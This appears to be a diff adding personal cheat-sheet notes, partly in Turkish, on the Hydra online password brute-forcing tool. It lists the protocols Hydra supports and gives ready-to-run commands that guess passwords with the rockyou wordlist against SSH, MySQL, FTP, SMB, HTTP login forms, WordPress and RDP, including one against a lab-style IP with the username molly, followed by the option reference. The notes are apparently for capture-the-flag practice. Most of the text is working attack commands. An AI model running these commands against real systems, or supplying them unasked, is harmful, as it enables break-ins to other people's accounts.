@@ -1,1 +1,75 @@
-başla
+HYDRA
+Hydra is a brute force online password cracking program; a quick system login password 'hacking' tool.
+
+Hydra has the ability to bruteforce the following protocols: Asterisk, AFP, Cisco AAA, Cisco auth, Cisco enable, CVS, Firebird, FTP,  HTTP-FORM-GET, HTTP-FORM-POST, HTTP-GET, HTTP-HEAD, HTTP-POST, HTTP-PROXY, HTTPS-FORM-GET, HTTPS-FORM-POST, HTTPS-GET, HTTPS-HEAD, HTTPS-POST, HTTP-Proxy, ICQ, IMAP, IRC, LDAP, MS-SQL, MYSQL, NCP, NNTP, Oracle Listener, Oracle SID, Oracle, PC-Anywhere, PCNFS, POP3, POSTGRES, RDP, Rexec, Rlogin, Rsh, RTSP, SAP/R3, SIP, SMB, SMTP, SMTP Enum, SNMP v1+v2+v3, SOCKS5, SSH (v1 and v2), SSHKEY, Subversion, Teamspeak (TS2), Telnet, VMware-Auth, VNC and XMPP.
+
+for details https://en.kali.tools/?p=220
+to download https://github.com/vanhauser-thc/thc-hydra
+
+-l  tek username
+-L  username list
+-p  tek passwd
+-P  passwd list
+-t  number of threads
+
+hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.84.44 http-post-form "/login:username=^USER^&password=^PASS^:Your username or password is incorrect."
+tek username molly
+rockyou passwd list
+burpten user passwd formatını öğren "/login: ile : arası değişken. 
+:'dan sonra fail geliyor
+
+hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.84.44 ssh
+tek username molly
+rockyou passwd list
+IP adresi ve ssh
+
+SSH
+hydra -f -l user -P /usr/share/wordlists/rockyou.txt $IP -t 4 ssh
+(use -s for custom port)
+
+MySQL
+hydra -f -l user -P /usr/share/wordlists/rockyou.txt $IP mysql
+(use -s for custom port)
+
+FTP
+hydra -f -l user -P /usr/share/wordlists/rockyou.txt $IP ftp
+(use -s for custom port)
+
+SMB
+hydra -f -l user -P /usr/share/wordlists/rockyou.txt $IP smb
+(use -s for custom port)
+
+HTTP POST FORM
+hydra -l user -P /usr/share/wordlists/rockyou.txt $IP http-post-form "<Login Page>:<Request Body>:<Error Message>"
+hydra -l user -P /usr/share/wordlists/rockyou.txt $IP http-post-form "/login.php:username=^USER^&password=^PASS^:Login Failed"
+(use -s for custom port)
+
+WordPress
+hydra -f -l user -P /usr/share/wordlists/rockyou.txt $IP -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'
+(use -s for custom port)
+
+Windows RDP
+hydra -f -l administrator -P /usr/share/wordlists/rockyou.txt rdp://$IP
+
+  -R        restore a previous aborted/crashed session
+  -S        perform an SSL connect
+  -s PORT   if the service is on a different default port, define it here
+  -l LOGIN or -L FILE  login with LOGIN name, or load several logins from FILE
+  -p PASS  or -P FILE  try password PASS, or load several passwords from FILE
+  -x MIN:MAX:CHARSET  password bruteforce generation, type "-x -h" to get help
+  -e nsr    try "n" null password, "s" login as pass and/or "r" reversed login
+  -u        loop around users, not passwords (effective! implied with -x)
+  -C FILE   colon separated "login:pass" format, instead of -L/-P options
+  -M FILE   list of servers to attack, one entry per line, ':' to specify port
+  -o FILE   write found login/password pairs to FILE instead of stdout
+  -f / -F   exit when a login/pass pair is found (-M: -f per host, -F global)
+  -t TASKS  run TASKS number of connects in parallel (per host, default: 16)
+  -w / -W TIME  waittime for responses (32) / between connects per thread (0)
+  -4 / -6   use IPv4 (default) / IPv6 addresses (put always in [] also in -M)
+  -v / -V / -d  verbose mode / show login+pass for each attempt / debug mode 
+  -O        use old SSL v2 and v3
+  -q        do not print messages about connection errors
+  -U        service module usage details
+  server    the target: DNS, IP or 192.168.0.0/24 (this OR the -M option)
+  service   the service to crack (see below for supported protocols)
+  OPT       some service modules support additional input (-U for module help)
